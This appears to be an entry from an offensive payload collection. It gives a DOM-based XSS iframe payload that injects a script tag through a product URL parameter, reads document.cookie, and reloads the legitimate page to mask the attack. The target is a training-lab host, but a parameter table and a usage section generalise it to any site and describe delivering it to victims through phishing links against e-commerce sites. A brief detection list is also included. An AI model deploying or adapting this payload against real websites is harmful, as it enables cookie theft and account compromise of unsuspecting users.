---
id: 6579d051-4a3d-4e58-957f-f4c9246726b8
type: code
language: html
verified: true
created_at: '2020-08-07T15:03:08.147101+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
platforms:
  - Web
tags:
  - DOM XSS
  - payload
  - injection
validated: true
---

# DOM-XSS-Cookie-Manipulation-Iframe-Payload

## Code

```html
<iframe src="https://aca71fbe1fd30d7180c004e800d800e9.web-security-academy.net/product?productId=1&'><script>alert(document.cookie)</script>" onload="if(!window.x)this.src='https://aca71fbe1fd30d7180c004e800d800e9.web-security-academy.net';window.x=1;">
```

## Description

This HTML iframe payload exploits a DOM-based XSS vulnerability by injecting a script tag into a URL parameter that gets written to document.cookie without sanitization. The onload event handler redirects the page to the legitimate site after execution, masking the malicious activity. It alerts the victim's document.cookie to demonstrate cookie access, but can be modified for further manipulation like setting custom cookie values.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| BASE_URL | The vulnerable application's base domain and path | https://target.com/product |
| PRODUCT_ID | Valid product ID to bypass initial validation | 1 |

## Usage

Embed this payload into a URL parameter (e.g., productId) and deliver via phishing or malicious link. When loaded, it triggers the XSS to execute JavaScript in the victim's context, allowing cookie reading or writing. Used in social engineering attacks against e-commerce sites with vulnerable cookie handling.

## Detection

- Browser console errors or JavaScript alerts indicating unsanitized input.
- Anomalous iframe loads or redirects in network logs.
- Client-side monitoring for document.cookie writes from URL sources.
- Web Application Firewall (WAF) rules for script injection in query parameters.

## Related

- [[procedures/DOM-XSS-Cookie-Manipulation]]
